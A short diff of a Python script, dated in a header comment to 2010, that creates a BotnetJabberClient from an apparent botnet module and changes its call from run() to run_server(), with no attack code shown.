@@ -6,5 +6,6 @@ Created on Mar 28, 2010
 '''
 from botnet import BotnetJabberClient
 
+
 bot = BotnetJabberClient()
-bot.run()
+bot.run_server()
